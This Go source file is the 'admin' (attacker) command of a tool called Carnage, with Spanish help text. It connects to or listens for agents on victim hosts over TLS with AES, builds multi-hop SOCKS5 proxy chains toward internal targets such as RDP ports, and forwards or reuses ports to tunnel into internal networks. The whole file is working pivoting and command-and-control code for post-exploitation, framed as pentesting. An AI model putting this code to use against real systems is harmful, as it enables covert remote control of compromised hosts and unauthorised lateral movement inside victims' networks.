package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/Falconmx1/Carnage/internal/forward"
	"github.com/Falconmx1/Carnage/internal/proxy"
	"github.com/Falconmx1/Carnage/internal/transport"
	"github.com/Falconmx1/Carnage/pkg/protocol"
	"github.com/spf13/cobra"
)

var (
	adminAgentIP    string
	adminAgentPort  int
	adminListenAddr string
	adminChainNodes string
	adminListenPort int
	adminTarget     string
	adminReuseAddr  string
)

var adminCmd = &cobra.Command{
	Use:   "admin",
	Short: "Modo Admin (atacante): conecta al Agent, encadena proxies y hace port forwarding",
	Long: `El Admin controla la sesión de pentesting:
  - connect: se conecta al Agent (víctima) con TLS + AES.
  - listen:  escucha conexiones entrantes de Agents.
  - chain:   crea una cadena SOCKS5 multi-salto.
  - forward: redirige un puerto local a un destino interno.
  - reuse:   comparte un puerto ya abierto (SO_REUSEPORT).`,
}

// ---------- connect ----------

var adminConnectCmd = &cobra.Command{
	Use:   "connect",
	Short: "Conectar al Agent (víctima) con TLS + AES",
	RunE: func(cmd *cobra.Command, args []string) error {
		addr := net.JoinHostPort(adminAgentIP, fmt.Sprintf("%d", adminAgentPort))

		rawConn, err := net.DialTimeout("tcp", addr, 10*time.Second)
		if err != nil {
			return fmt.Errorf("error conectando a %s: %w", addr, err)
		}

		conn, gcm, err := transport.ClientHandshake(rawConn)
		if err != nil {
			rawConn.Close()
			return fmt.Errorf("error en handshake con %s: %w", addr, err)
		}
		defer conn.Close()

		// Enviar handshake de protocolo cifrado
		hs := protocol.NewHandshake("carnage-admin")
		enc, err := transport.Encrypt(gcm, hs.Payload)
		if err != nil {
			return fmt.Errorf("error cifrando handshake: %w", err)
		}
		if _, err := conn.Write(append([]byte{byte(hs.Type)}, enc...)); err != nil {
			return fmt.Errorf("error enviando handshake: %w", err)
		}

		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
		buf := make([]byte, 4096)
		n, err := conn.Read(buf)
		if err != nil {
			return fmt.Errorf("error leyendo respuesta: %w", err)
		}
		fmt.Printf("[+] Conexión establecida con el Agent %s\n", addr)
		fmt.Printf("[+] Respuesta (%d bytes): %x\n", n, buf[:n])
		fmt.Println("[+] Sesión activa. Ctrl+C para salir.")
		waitForSignal()
		return nil
	},
}

// ---------- listen ----------

var adminListenCmd = &cobra.Command{
	Use:   "listen",
	Short: "Escuchar conexiones entrantes de Agents",
	RunE: func(cmd *cobra.Command, args []string) error {
		cert, err := transport.GenerateSelfSignedCert()
		if err != nil {
			return fmt.Errorf("error generando certificado: %w", err)
		}

		ln, err := tls.Listen("tcp", adminListenAddr, &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS13,
		})
		if err != nil {
			return fmt.Errorf("error escuchando en %s: %w", adminListenAddr, err)
		}
		defer ln.Close()
		fmt.Printf("[+] Admin escuchando en %s (TLS 1.3)\n", adminListenAddr)

		ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
		defer cancel()

		go func() {
			<-ctx.Done()
			ln.Close()
		}()

		for {
			conn, err := ln.Accept()
			if err != nil {
				select {
				case <-ctx.Done():
					return nil
				default:
					fmt.Printf("[-] Error aceptando conexión: %v\n", err)
					continue
				}
			}
			go handleAdminConn(conn)
		}
	},
}

func handleAdminConn(conn net.Conn) {
	defer conn.Close()
	buf := make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Printf("[-] Error leyendo de %s: %v\n", conn.RemoteAddr(), err)
		return
	}
	fmt.Printf("[+] Conexión de %s: %x\n", conn.RemoteAddr(), buf[:n])
	conn.Write([]byte("CARNAGE_OK\n"))
}

// ---------- chain ----------

var adminChainCmd = &cobra.Command{
	Use:   "chain",
	Short: "Crear una cadena SOCKS5 multi-salto",
	RunE: func(cmd *cobra.Command, args []string) error {
		if adminChainNodes == "" {
			return fmt.Errorf("debes especificar --nodes con la lista de nodos SOCKS5 (separados por coma)")
		}
		if adminTarget == "" {
			return fmt.Errorf("debes especificar --target con el destino final (ej. 10.0.0.5:3389)")
		}

		nodes := splitAndTrim(adminChainNodes, ",")
		if len(nodes) == 0 {
			return fmt.Errorf("lista de nodos vacía")
		}

		fmt.Printf("[+] Cadena SOCKS5 con %d nodos:\n", len(nodes))
		for i, n := range nodes {
			fmt.Printf("    [%d] %s\n", i+1, n)
		}

		chain, err := proxy.BuildChain(nodes)
		if err != nil {
			return fmt.Errorf("error construyendo cadena: %w", err)
		}

		ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
		defer cancel()

		fmt.Printf("[+] Escuchando en %s -> %s (vía cadena)\n", adminListenAddr, adminTarget)
		return proxy.LocalForwarder(ctx, adminListenAddr, chain, adminTarget)
	},
}

// ---------- forward ----------

var adminForwardCmd = &cobra.Command{
	Use:   "forward",
	Short: "Port forwarding: redirigir un puerto local a un destino interno",
	RunE: func(cmd *cobra.Command, args []string) error {
		if adminTarget == "" {
			return fmt.Errorf("debes especificar --target (ej. 127.0.0.1:3389)")
		}
		listen := fmt.Sprintf("127.0.0.1:%d", adminListenPort)
		return forward.TCPForward(listen, adminTarget)
	},
}

// ---------- reuse ----------

var adminReuseCmd = &cobra.Command{
	Use:   "reuse",
	Short: "Port reuse: compartir un puerto ya abierto (SO_REUSEPORT)",
	RunE: func(cmd *cobra.Command, args []string) error {
		if adminTarget == "" {
			return fmt.Errorf("debes especificar --target (ej. 127.0.0.1:3389)")
		}
		ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
		defer cancel()
		return forward.ReuseForward(ctx, adminReuseAddr, adminTarget)
	},
}

// ---------- utilidades compartidas ----------

func waitForSignal() {
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, os.Interrupt, syscall.SIGTERM)
	<-ch
	fmt.Println("\n[!] Saliendo...")
}

func splitAndTrim(s, sep string) []string {
	parts := strings.Split(s, sep)
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p != "" {
			out = append(out, p)
		}
	}
	return out
}

// Evita warnings de imports no usados
var (
	_ = sync.WaitGroup{}
	_ = time.Now
)
